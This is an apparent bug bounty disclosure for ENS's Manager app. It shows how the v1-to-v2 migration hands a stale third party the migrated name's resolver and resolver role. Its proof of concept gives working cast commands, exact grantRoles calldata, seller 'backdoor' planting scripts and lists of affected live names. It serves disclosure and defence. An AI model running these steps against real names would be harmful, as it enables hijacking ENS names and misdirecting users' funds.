# 89516 w a critical v1 v2 migration assigns the migrated name s resolver to a third party and grants them the role that keeps it

**Submitted on Aug 19th 2026 at 17:45:18 UTC by @Lun3x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89516
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

A `.eth` name that changed hands on v1 is normally left with its old registry owner ("manager") still in place; ENS's own docs say transferring the registrant does not update the controller, and that the registrant fixes it by calling `reclaim()`.

When the Manager migrates such a name, three things happen inside the one flow the user is told is "migration":

{% stepper %}
{% step %}

## The migrated v2 name is given the resolver contract that the old manager chose

This includes the address records they already wrote there.
{% endstep %}

{% step %}

## The batch the user signs grants the old manager resolver authority

The batch contains `grantRoles(<name>, ROLE_SET_RESOLVER, <that old manager>)`.
{% endstep %}

{% step %}

## The v1 ERC-721 leaves the user's wallet

`reclaim()`—the remedy that would have removed that party on v1—is gone for good.
{% endstep %}
{% endstepper %}

Executed today on **`kiln.eth`**, a live Sepolia name already in this state, at Sepolia fork block 11,523,380 (2026-08-19): the third party set `kiln.eth`'s address record to `0x…dEaD`, the holder migrated through the app's own plan, and `UniversalResolver` then answered `kiln.eth → 0x000000000000000000000000000000000000dEaD` through the resolver the migration installed. The holder's attempt to correct that record reverts. Their attempt to `reclaim()` reverts. When they do the one thing left—repoint the resolver—the granted party puts it back, and the name resolves to `0x…dEaD` again.

Measured live on 2026-08-19 against `https://v1-graphql.ens.dev/subgraph`, sweeping the eligible population to exhaustion: of **3,121** migration-eligible unwrapped `.eth` 2LDs, **1,893 (60.7%)** take the "keep the v1 resolver" branch, **118** would emit the role grant, and **81** are on both arms right now—`kiln.eth`, `turnkey.eth`, `web3labs.eth`, `visionfoundation.eth`, `divi.eth`, `testdeployment.eth` among them, with `aragon-dao.eth` on the grant arm only (its v1 resolver *is* one of the nine). The attacker's side costs one `setResolver` and one `setAddr` on a name they are selling: no privileged role, no contract deployment, and no victim interaction beyond the migration the victim came to perform.

The Manager never shows the address. It renders `managerAddress` **zero** times, contains no `revokeRoles` call, and the only copy for the step is *"Approve manager restoration — Restore the existing managers for your names."*

## Vulnerability Details

|                           |                                                                                                                                                                                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Asset                     | **Manager app Files** (`apps/manager`), scope entry dated 6 August 2026                                                                                                                                                                   |
| Also in scope, and used   | `packages/migration` (shared package compiled into the Manager)                                                                                                                                                                           |
| Repo / commit             | `immunefi-team/audit-comp-ens` @ `1c9b47f18fcddd2e864dfe385c4171061c9811ae` (branch `audit-comp-ready`)                                                                                                                                   |
| Deployed artifact checked | `app.ens.dev`, 2026-08-19 — entry `assets/index-CcNccUE2.js` → `assets/migration-CmgvIteB.js`, `assets/useEligibleV1Names-B5kQt4VR.js`                                                                                                    |
| Impact line claimed       | **Critical — "Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker"** |

**Siblings checked and ruled out.** `managerAddress` is `null` on every wrapped branch of `classifyName` (`unlocked`, `locked-2ld`, `locked-child`, `detached-child`)—only the `unwrapped` `.eth` 2LD branch carries it, so this report is about unwrapped names only. The Explorer app (`apps/portal`) has no migration plan builder—only `UpgradeBanner.tsx` and `useMigrationStatus.ts`—so the defect is Manager-only. The Explorer is nonetheless where the two remedies live, which matters below.

**Not the ENS contracts.** Every decision in this report is made in app code: which address to grant a role to (`classifyNames.ts`, `buildRoleGrantCalls.ts`), which resolver to write into the migration data (`resolverStrategyFor`), and what to tell the user (nothing). The contracts execute exactly what the app asks for.

### Mechanism

Three lines of app code, in the order the flow reaches them.

#### 1. The grantee is derived, from a subgraph row, as "whoever is not the registrant"

`packages/migration/src/service/classifyNames.ts`, `unwrapped` branch:

```ts
const registrant = domain.registrant
if (registrant?.id.toLowerCase() !== addr) return null       // the migrator must hold the NFT
...
const registryOwnerAddress = toAddress(domain.owner.id)      // v1 registry owner == "manager"
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

The condition *is* "this address is not the person migrating". That is the same condition as "this name was transferred and never reclaimed".

#### 2. The resolver the same party chose is kept

Same file:

```ts
if (v1ResolverAddress && !isKnownPublicResolver(v1ResolverAddress)) {
  return 'keep-v1'
}
```

`isKnownPublicResolver` compares against nine hard-coded addresses (`packages/migration/src/contracts/knownResolvers.ts`). One address that is *not* among them—`0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5`—is the resolver used by **1,613 of the 3,121** eligible names, which is why `keep-v1` is the majority branch rather than an edge case. The v1 resolver pointer is set with `ENSRegistry.setResolver`, i.e. by the v1 registry owner—the party from step 1, not the registrant who migrates.

#### 3. The grant is added to the signed batch and treated as a success criterion

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts`:

```ts
const ROLE_SET_RESOLVER = 1n << 24n
export const buildRoleGrantCall = (name: ClassifiedName): Call => ({
  to: V2_CONTRACTS.ETHRegistry,
  data: encodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI, functionName: 'grantRoles',
    args: [labelToCanonicalId(name.label), ROLE_SET_RESOLVER, name.managerAddress],
  }),
  value: 0n,
})
```

`buildAtomicMigrationBatches.ts:608-625` pushes it as an inner execution and adds a `verificationExpectations` entry, so the app checks afterwards that the third party really did receive the role.

The authority that lets the grant land is the step the user *is* shown: "Approve manager restoration" is `ETHRegistry.setApprovalForAll(hca, true)` (`migrationApprovals.ts`, approval id `eth-registry:hca`). Without it the same `grantRoles` call reverts `0xd1a3b355`; with it, it succeeds.

**The grantee is never re-read on chain.** It comes from the subgraph row the plan was built from. There is no `ENSRegistry.owner(node)` read anywhere in the Manager's migration path (`grep -rn "ensLegacyRegistry"` over `apps/manager/src/features/migration` and `packages/migration/src` → no hits, while the same grep finds it in the Explorer's `V1NameManagerRecord.tsx`). A buyer who learns about the stale manager, calls `reclaim()` elsewhere, and comes back to the open Manager tab still signs the grant to the old address.

### Executed sequence

One live name, nothing planted before step 1, every value read off the fork. Full transcript and commands in the Proof of Concept section.

| # | who acts                        | action                                                                                                                                                                | state after                                                                                                                                                                                |
| - | ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 0 | —                               | read live state                                                                                                                                                       | `kiln.eth`: registrant `0x3e8983d0…2303`, v1 registry owner `0xbd55D3bB…a90a`, v1 resolver `0xE99638b4…49b5`, v2 status 1 (migratable). `UniversalResolver`: `kiln.eth → 0x3e8983d0…2303`  |
| 1 | third party (v1 registry owner) | `setAddr(node, 0x…dEaD)` on that resolver                                                                                                                             | status `0x1`; record is now the attacker's. **Controls:** the same call from the registrant reverts; from an unrelated address reverts                                                     |
| 2 | holder (registrant)             | migrates — `safeTransferFrom` to `UnlockedMigrationController` with the app's own migration data, whose resolver field is the app's `keep-v1` value `0xE99638b4…49b5` | status `0x1`; v2 owner = holder; v2 resolver = `0xE99638b4…49b5`; **`UniversalResolver`: `kiln.eth → 0x…dEaD` via `0xE99638b4…49b5`**                                                      |
| 3 | holder                          | tries to correct the record; tries `reclaim()`                                                                                                                        | both **revert**. v1 ERC-721 and v1 registry ownership are now `0xF83Fe265…4750` (a contract, neither party). The hostile record is frozen in place                                         |
| 4 | holder's HCA                    | the batch's `manager-role-grant`, byte-for-byte as the app builds it                                                                                                  | status `0x1`; `hasRoles(resource, 1<<24, 0xbd55D3bB…a90a) == true`                                                                                                                         |
| 5 | holder                          | repoints the v2 resolver to their own                                                                                                                                 | status `0x1`, resolver fixed                                                                                                                                                               |
| 6 | third party                     | `setResolver` using the granted role                                                                                                                                  | status `0x1`; resolver back to `0xE99638b4…49b5`; `kiln.eth → 0x…dEaD` again. **Control:** the same call from an address with no role reverts `0x4b27a133` (`EACUnauthorizedAccountRoles`) |
| 7 | holder                          | `revokeRoles`, then repoint                                                                                                                                           | both succeed, and the third party's repoint then reverts. This is the only effective remedy, and it is two transactions in a different app                                                 |

There is no race in this and no timing margin to state: step 1 can be done at any point before the victim migrates, and steps 4–6 are available indefinitely afterwards.

**The state also arises with no attacker.** 118 live names are in it today because their owners transferred the registrant and never reclaimed. And it is trivially plantable: a seller points the v1 registry owner at a burner they keep, then sells the NFT—executed, both halves, in the PoC.

### Why it does not self-correct

* **The record cannot be fixed at the resolver.** After migration, write authority on `0xE99638b4…49b5` for that node belongs to the v1 registry owner, and the migration moved that to `0xF83Fe265…4750`. Executed: the holder's `setAddr` reverts (step 3).
* **The v1 remedy is destroyed by the flow itself.** `reclaim()` requires holding the v1 ERC-721. The migration transfers it away. Executed: reverts (step 3). This is the one point where the app makes a repairable v1 misconfiguration permanent—before migration, one `reclaim()` would have ended it.
* **The remaining remedy is undone by the grant.** Executed, steps 5 and 6: repoint, and the granted party repoints back.
* **The remedy that works needs two steps in a different app.** `revokeRoles` first, then repoint. `grep -rn "revokeRoles" apps/manager/src` → **no hits**. The Manager cannot undo what it granted. Both live in the Explorer's roles page.

### Why nobody noticed

* The value has no rendered surface in the Manager. `grep -rn managerAddress apps/manager/src --include=*.tsx` → one hit, a test fixture set to `null`. The only thing derived from it for the UI is the boolean `requiresManagerRestoration`, which selects an approval step whose descriptor is `{ type: 'approval', approvalId: 'eth-registry:hca' }`—a shape with no field that could carry an address. Rendered and asserted, not only grepped: the select step and the confirmation dialog were mounted with a name whose `managerAddress` is set, and neither contains the address in full or truncated form.
* The wallet prompt for that step shows `setApprovalForAll`, not the grant. The grant is one inner call inside the batched migration signed afterwards.
* The one place it could be seen after the fact is the Explorer's roles table, which rebuilds holders by replaying `EACRolesChanged` **scoped to the registry** with `MAX_EVENTS = 1000` (`apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:50`; `k=1e3` in the deployed `useNameRoleAccounts-DZoB1-ZW.js`). `ETHRegistry` is shared by every `.eth` 2LD, so that budget is registry-wide: a paginated sweep of that registry on `staging-graphql.ens.dev`—the endpoint both deployed apps compile in—returns **2,559** such events today against the window of 1,000 (control: the same query on `graphql.ens.dev`, the other deployment, returns 0). A grant is visible immediately after migration and ages out as other names' role events accumulate. And `RolesSidebar.tsx:84` takes the revoke target from the selected table **row** (`const selectedAccount = row?.original.account`), so a holder with no row cannot be removed in-app at all.

### Not a duplicate of the published known issues

Stated plainly because a reviewer will find it:

* **`packages/migration/src/service/classifyNames.test.ts:105`** — *"unwrapped 2LD: keeps custom v1 resolver, flags manager when registry owner differs"* — asserts both behaviours, and `buildRoleGrantCalls.test.ts:12` asserts the grant targets `ETHRegistry` with `ROLE_SET_RESOLVER`. Both derivations are intended. This report is not that the derivation is a coding error; it is that the intent ("restore the manager the owner delegated to") and the condition the code actually tests ("this address is not the person migrating") are not the same set, that the difference is exactly the post-sale and attacker-planted case, and that the flow neither discloses the grant nor provides a way to remove it.
* **Your known-issues register, Part 2**, states the carve-in this report relies on: *"a demonstrated security consequence of one of them (for example, a role combination that grants authority it should not, rather than merely erroring) goes beyond the known breakage and is a new finding."*
* No entry in the register covers migration, role grants, `managerAddress`, or the resolver strategy. The Manager entries are `SEC-MGR-003`, `SEC-MGR-008/011`, `SEC-MGR-010`; R3-01…R3-08 are transaction-manager liveness and data-integrity defects; `R2-03`/`R2-06` are the session key; `EXP-4337-002/003` are transport chainId and `request.from`. `QA-01` and `WEB-1305`/`WEB-1257` concern role combinations during **transfer**, which is a different flow and a different code path.
* Nothing here depends on a label being un-normalized, so it shares no root cause with the normalization reports filed separately in this competition. `kiln` normalizes to itself.
* No vendor source names this mechanism as of 2026-08-19: no issue, PR, commit, doc page or audit entry reachable from `ensdomains/*` or this repo's history describes the migration re-granting the v1 manager or preserving its resolver. This repo is a squashed fork with three commits and the upstream `apps-monorepo` is private, so the search that is possible is the public one plus your own register.

## Impact Details

**Critical — "Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker."**

The match is on the words: the flow is v1→v2 migration, the assignment is the resolver, the assignee is a party who is not the owner, and it is the owner's own transaction that does it. Executed end to end above.

Two further published Critical lines describe the same executed facts; I claim the migration line as the primary because it is the narrowest fit, and name these so the impact is not undercounted:

* *"Causing the application to display or pre-fill an incorrect address … such as: resolving or rendering an ENS name to an attacker-controlled address"* — after step 2, `UniversalResolver` answers `kiln.eth → 0x…dEaD`.
* *"Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters"* — state the attacker plants adds `grantRoles(…, attacker)` to the batch the connected wallet signs.

**Band.** Program severity is set by impact type, with the amount at risk placing the payout inside the tier. This deployment is Sepolia, so there is no dollar figure to quote and I do not invent one. What sets the band:

* The addressable set is every name that migrates through this flow. Today, exhaustively measured: **3,121** eligible names, **1,893** on the resolver branch, **118** on the grant branch, **81** on both. Migration is not an optional feature—it is the one path a v1 holder takes to v2, so the denominator is the whole v1 population over time, not a sampled feature's traffic.
* Attacker cost is two ordinary transactions on a name they already hold, before selling it. No privileged role, no contract, no user interaction beyond the migration itself.
* The same code is the migration path that will run at mainnet launch. I did not measure the mainnet v1 population and do not claim a mainnet figure.

**Exclusions checked.** Not a leaked key or credential. Not a privileged address—the v1 registry owner is an ordinary user-level role, and the impersonations in the PoC are of parties that already hold what they use (registrant, registry owner, an approved operator). Not a test or configuration file. Not theoretical: executed on a fork of live Sepolia with three one-variable controls. Not an un-prompted action outside the normal workflow—migration is the workflow. Not the ENS contracts, subgraph or metadata service: the defect is which address the app grants a role to, which resolver it writes, and what it tells the user. Not a UI-only impact: the resulting state is on chain.

**Precedent.** ENS's own documentation is the closest published reference point, and it is on the mechanism rather than the severity: transferring the registrant does not update the controller, and the registrant's remedy is `reclaim()` ([.eth Permanent Registrar](https://docs.ens.domains/contract-api-reference/.eth-permanent-registrar)). This report is that the migration consumes that stale value as an authority and removes the remedy.

### Scope of the claim

**Which bullet is claimed.** The holder retains `ROLE_SET_RESOLVER_ADMIN`, so `revokeRoles` followed by a repoint does end the capture—executed at step 7. The third bullet of the Critical migration line, *"leaving a name permanently inaccessible after the flow"*, is therefore **not** the bullet claimed here. The bullet claimed is the first, *"a migration that assigns the name, its ownership, registry, or resolver to an attacker"*, which is exactly what steps 2 and 4 execute.

The asymmetry is the point: the capture is produced by the flow the holder came to use, in one signature, with no disclosure. Undoing it requires the holder to first discover that a role was granted at all—from a Manager that renders the grantee zero times and contains no `revokeRoles`, via an Explorer roles table that cannot list the grantee once 1,000 registry-wide role events have accumulated (2,559 exist today) and whose revoke control reads its target from a table row that therefore does not exist.

Two smaller concessions:

* The pre-migration redirect is v1 registry behaviour; the PoC shows it at step 1 and this report does not count it as impact. What the flow adds, and what is counted, is carrying that value into v2 as the migrated name's resolver, destroying `reclaim()` in the same transaction, and granting the role that defeats the only remaining fix.
* A deliberate registrant/manager delegation and a name sold without `reclaim()` are indistinguishable to `classifyNames.ts`: the condition it tests is "this address is not the person migrating", which is true of both. The flow grants resolver authority on the strength of that condition alone, and shows the user neither the address nor the grant.

## References

* `packages/migration/src/service/classifyNames.ts:163-167` — `managerAddress` = v1 registry owner when it differs from the registrant
* `packages/migration/src/service/classifyNames.ts:65-89` — `resolverStrategyFor`, the `keep-v1` branch
* `packages/migration/src/contracts/knownResolvers.ts` — the nine-entry allowlist; `0xE99638b4…49b5` is absent
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts` — `ROLE_SET_RESOLVER = 1n << 24n`, `grantRoles(resource, ROLE_SET_RESOLVER, name.managerAddress)`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:610` — `phase: 'manager-role-grant'` and its `verificationExpectations` entry
* `apps/manager/src/features/migration/service/migrationApprovals.ts` — approval id `eth-registry:hca`, the "Approve manager restoration" step
* `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:84,87` — the only copy shown for that step
* `apps/manager/src/features/migration/components/GameStep.tsx:137` — the same copy in the progress line
* `apps/portal/src/features/roles/hooks/useNameRoleAccounts.ts:50,89` — `MAX_EVENTS = 1000`, applied registry-wide
* `apps/portal/src/features/roles/components/RolesSidebar.tsx:84` — revoke target read from the selected table row
* `apps/portal/src/features/ownership/components/V1NameManagerRecord.tsx` — the only place the v1 registry owner is read on chain
* `packages/migration/src/service/classifyNames.test.ts:105`, `buildRoleGrantCalls.test.ts:12` — the project's own assertions on both derivations
* Sepolia: v1 `ENSRegistry 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`, v1 `BaseRegistrar 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85`, v2 `ETHRegistry 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, `UnlockedMigrationController 0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73`, `UniversalResolver 0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe`
* ENS docs, .eth Permanent Registrar — transferring the registrant does not update the controller; the registrant's remedy is `reclaim()`

## Proof of Concept

Everything below was executed on 2026-08-19. All chain writes are on a local Anvil fork of Sepolia; nothing was written to a live network. Read-only calls are against public endpoints.

### 0. Setup

```bash
git clone --branch audit-comp-ready https://github.com/immunefi-team/audit-comp-ens repo
cd repo && pnpm install                      # node 22, pnpm 10
foundryup                                    # anvil + cast 1.7.1 used here
```

Pinned facts, all confirmed on live Sepolia today:

```
v1 ENSRegistry                 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
v1 BaseRegistrar (.eth)        0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
v2 ETHRegistry                 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
v2 UnlockedMigrationController 0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73
UniversalResolver (answering)  0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe

subject   kiln.eth
  v1 ERC-721 registrant        0x3e8983d0df94f7AF2f830eB5E49d10917dB92303
  v1 registry owner (manager)  0xbd55D3bB25Ac799d3E463b6945C570045aC1a90a
  v1 resolver                  0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
  v2 status                    1   (reserved -> migratable)
```

Verify that state yourself:

```bash
R=https://ethereum-sepolia-rpc.publicnode.com
cast call 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e 'owner(bytes32)(address)' \
  $(cast namehash kiln.eth) --rpc-url $R                      # -> 0xbd55D3bB…a90a
cast call 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85 'ownerOf(uint256)(address)' \
  $(cast to-dec $(cast keccak kiln)) --rpc-url $R             # -> 0x3e8983d0…2303
cast call 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e 'resolver(bytes32)(address)' \
  $(cast namehash kiln.eth) --rpc-url $R                      # -> 0xE99638b4…49b5
```

### A. Who can write this name's records today — live, no fork, no state change

`eth_call` from three different senders. This is the fact the rest rests on: the party who can write `kiln.eth`'s address record is not the party who holds it.

```bash
R=https://ethereum-sepolia-rpc.publicnode.com
RES=0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
NODE=$(cast namehash kiln.eth)
D=0x000000000000000000000000000000000000dEaD

cast call --from 0xbd55D3bB25Ac799d3E463b6945C570045aC1a90a $RES \
  'setAddr(bytes32,address)' $NODE $D --rpc-url $R     # v1 registry owner  -> 0x   (succeeds)
cast call --from 0x3e8983d0df94f7AF2f830eB5E49d10917dB92303 $RES \
  'setAddr(bytes32,address)' $NODE $D --rpc-url $R     # the actual holder  -> execution reverted
cast call --from 0x000000000000000000000000000000000000c0Fe $RES \
  'setAddr(bytes32,address)' $NODE $D --rpc-url $R     # unrelated address  -> execution reverted
```

### B. The app's own plan, on live rows — 5 assertions, 4 real names + a control

Drop `__poc_live_both_arms.test.ts` (reproduced at the end of this section) into `apps/manager/src/features/migration/service/` and run:

```bash
pnpm --filter manager exec vitest run \
  src/features/migration/service/__poc_live_both_arms.test.ts --silent=false --reporter=verbose
```

It fetches each name with the app's own document from `https://v1-graphql.ens.dev/subgraph`, runs the app's `classifyName` with the **real registrant** as the connected wallet, runs `buildAtomicMigrationBatches`, and decodes every `grantRoles` call in the result.

```
kiln.eth
  registrant (migrator) : 0x3e8983d0df94f7af2f830eb5e49d10917db92303
  v1 registry owner     : 0xbd55d3bb25ac799d3e463b6945c570045ac1a90a
  v1 resolver           : 0xe99638b40e4fff0129d56f03b55b6bbc4bbe49b5
  resolverStrategy      : keep-v1
  migrationData.resolver: ["0xe99638b40e4fff0129d56f03b55b6bbc4bbe49b5"]
  managerAddress        : 0xbd55d3bb25ac799d3e463b6945c570045ac1a90a
  grant                 : [{"data":"0x7c300586e14221b18cb7f147f37f4ae0c36bc02a9acf61b015bb1c8e256852020000
                            0000000000000000000000000000000000000000000000000000000001000000000000000000
                            0000000000000000bd55d3bb25ac799d3e463b6945c570045ac1a90a",
                            "phase":"manager-role-grant","to":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
                            "resource":"1018872353818697053148275384855153575920044455357927516532920700747940123115
                             52","roles":"16777216","account":"0xbd55D3bB25Ac799d3E463b6945C570045aC1a90a",
                            "inSignedCalldata":true}]

turnkey.eth   … managerAddress 0x5f71c607…7e3E, keep-v1, resolver 0xe99638b4…49b5, inSignedCalldata true
web3labs.eth  … managerAddress 0x5f71c607…7e3E, keep-v1, resolver 0xe99638b4…49b5, inSignedCalldata true
testdeployment.eth … managerAddress 0xacea33e3…d05b, keep-v1, resolver 0x60ed8300…2ab6, inSignedCalldata true

control managerAddress: null grants: 0        # same live row, owner.id patched to the registrant
Test Files  1 passed (1)
      Tests  5 passed (5)
```

`inSignedCalldata: true` means those bytes appear verbatim inside the outer call the wallet signs. `resource` is `labelToCanonicalId('kiln')`—`keccak("kiln")` with the low 32 bits cleared:

```bash
python3 -c "h=int('$(cast keccak kiln)',16); print(h ^ (h & 0xffffffff))"
### 101887235381869705314827538485515357592004445535792751653292070074794012311552
```

`roles = 16777216 = 1 << 24 = ROLE_SET_RESOLVER`.

### C. The whole chain on a Sepolia fork

```bash
B=$(cast block-number --rpc-url https://ethereum-sepolia-rpc.publicnode.com)
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --fork-block-number $((B-3)) --port 8545
### ran at fork block 11523380

### positive control that the fork carries live state before anything is done:
cast call 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e 'resolver(bytes32)(address)' \
  $(cast namehash kiln.eth) --rpc-url http://127.0.0.1:8545     # -> 0xE99638b4…49b5

GRANT=0x7c300586e14221b18cb7f147f37f4ae0c36bc02a9acf61b015bb1c8e2568520200000000000000000000000000000000000000000000000000000000000000000\
1000000000000000000000000000000bd55d3bb25ac799d3e463b6945c570045ac1a90a
bash poc_migration_record_capture.sh kiln.eth $GRANT
```

The script impersonates only parties that already hold what they use, and step 4 sends the calldata printed by part B byte for byte.

```
== 0. read off the fork, i.e. live Sepolia state ==
   name                        = kiln.eth
   ERC-721 registrant (holder) = 0x3e8983d0df94f7AF2f830eB5E49d10917dB92303
   v1 registry owner (3rd pty) = 0xbd55D3bB25Ac799d3E463b6945C570045aC1a90a
   v1 resolver                 = 0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
   addr(60) today              = 0x3e8983d0df94f7AF2f830eB5E49d10917dB92303
   v2 status (1 = migratable)  = 1
   a client resolving kiln.eth: addr=0x3e8983d0df94f7af2f830eb5e49d10917db92303  via resolver 0xae66c62AcAE72098BdAc57d8E8AED53EF000b2Ba

== 1. the third party writes the name's address record (they can, today) ==
   -> status 0x1
   addr(60) now                = 0x000000000000000000000000000000000000dEaD
   CONTROL: the holder attempts the same write:
   -> REVERT: execution reverted
   CONTROL: an unrelated address attempts it:
   -> REVERT: execution reverted
   addr(60) still              = 0x000000000000000000000000000000000000dEaD
   a client resolving kiln.eth: addr=0x…dead  via resolver 0xae66c62A…b2Ba   <- unchanged, the v2 side still bridges

== 2. the holder migrates. The resolver in the migration data is the app's own
      keep-v1 value for this name (0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5) ==
   -> status 0x1
   v2 owner                    = 0x3e8983d0df94f7AF2f830eB5E49d10917dB92303
   v2 resolver                 = 0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
   what the name resolves to   = 0x000000000000000000000000000000000000dEaD   <- the third party's value
   a client resolving kiln.eth: addr=0x…dead  via resolver 0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5

== 3. who holds v1 authority now? ==
   v1 ERC-721 owner            = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
   v1 registry owner           = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
   the holder tries to correct the record on the resolver their name now uses:
   -> REVERT: execution reverted
   the holder tries the v1 remedy reclaim():
   -> REVERT: execution reverted
   addr(60) still              = 0x000000000000000000000000000000000000dEaD   <- frozen at the third party's value

== 4. the migration batch's manager-role-grant, byte-for-byte as the app builds it ==
   -> status 0x1        (setApprovalForAll — the "Approve manager restoration" step)
   -> status 0x1        (the grant)
   third party holds ROLE_SET_RESOLVER: true

== 5. the holder's only remedy, and what happens to it ==
   -> status 0x1
   v2 resolver = 0x00000000000000000000000000000000000000D1   <- fixed
   the third party uses the grant:
   -> status 0x1
   v2 resolver = 0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5   <- captured again
   a client resolving kiln.eth: addr=0x…dead  via resolver 0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5
   CONTROL: an address with no role attempts the same repoint:
   -> REVERT: custom error 0x4b27a133      (EACUnauthorizedAccountRoles)

== 6. the only effective remedy — two steps, in an app that is not the Manager ==
   -> status 0x1                                    (revokeRoles, by the holder)
   third party holds ROLE_SET_RESOLVER: false
   -> REVERT: custom error 0x4b27a133               (the third party's repoint, now unauthorised)
   -> status 0x1                                    (the holder repoints)
   v2 resolver = 0x00000000000000000000000000000000000000D1
```

`a client resolving kiln.eth` is `UniversalResolver.resolve(dnsEncode("kiln.eth"), abi.encodeWithSelector(addr(bytes32), node))` on `0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe`, i.e. the same read a wallet or dapp performs. It returns the attacker's address and names the resolver it used.

### D. How the state arises, and how it is planted

```bash
bash poc_v1_stale_controller.sh allania.eth        # a plain sale leaves the manager behind
```

```
BEFORE  registrant(ERC721)=0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
        controller(registry)=0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
seller sells the NFT (safeTransferFrom, the marketplace path):  status = 0x1
AFTER   registrant(ERC721)=0x0000000000000000000000000000000000B00b00     <- buyer
        controller(registry)=0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750   <- still the seller
```

```bash
bash poc_seller_plants_backdoor.sh allania.eth     # the deliberate version
```

```
1) seller points the v1 registry owner at a burner they keep -> status 0x1
2) seller sells the NFT                                      -> status 0x1
after:  registrant=0x…b0B0b0 (buyer)   registry owner=0x…cafE (seller's burner)
```

```bash
bash poc_operator_can_grant.sh 93                  # what the approval step is for
```

```
A) operator with NO approval calls grantRoles:  reverted (custom error 0xd1a3b355)
   owner setApprovalForAll(operator,true)    -> 0x1     <- "Approve manager restoration"
B) same operator, now approved:               status 0x1
   third party hasRoles(SET_RESOLVER) = true
```

```bash
bash poc_thirdparty_roles_survive.sh               # the grant outlives later sales of the name
```

```
BEFORE transfer: seller: SET_SUBREGISTRY SET_RESOLVER SET_RESOLVER_ADMIN | burner: SET_RESOLVER | buyer: (none)
transfer seller -> buyer  -> status 0x1
AFTER  transfer: seller: (none) | burner: SET_RESOLVER | buyer: SET_SUBREGISTRY SET_RESOLVER SET_RESOLVER_ADMIN
```

### E. Population — live, exhaustive, one denominator

```bash
node poc_migration_arms_population.mjs
```

Mirrors the Manager's own document (`v1SubgraphClient.ts`) and `classifyName`, sweeps with an `id_gt` cursor until the last page is short, and carries a positive control:

```
endpoint            : https://v1-graphql.ens.dev/subgraph
pages fetched       : 10  (last page 332 rows -> exhausted: true)
rows scanned        : 9332
positive control (testdeployment present in sweep): true
--- denominator: migration-eligible unwrapped .eth 2LDs (classifyName -> 'unwrapped') ---
eligible                                  : 3121
  arm A  registry owner != registrant      : 118   (3.8%)
  arm B  resolver not allowlisted (keep-v1): 1893  (60.7%)
  BOTH arms on one name                    : 81    (2.6%)
--- resolver histogram over the eligible population (top 4) ---
  0xe99638b40e4fff0129d56f03b55b6bbc4bbe49b5   1613  NOT allowlisted -> keep-v1
  none                                          616  no resolver     -> to-owned-permres
  0x8fade66b79cc9f707ab26799354482eb93a5b7dd    607  allowlisted     -> to-owned-permres
  0x8948458626811dd0c23eb25cc74291247077cc51     80  NOT allowlisted -> keep-v1
--- names on BOTH arms (first 12) ---
  turnkey.eth  web3labs.eth  curious-newt.eth  kiln.eth  piikachuw.eth  ethcc-test.eth
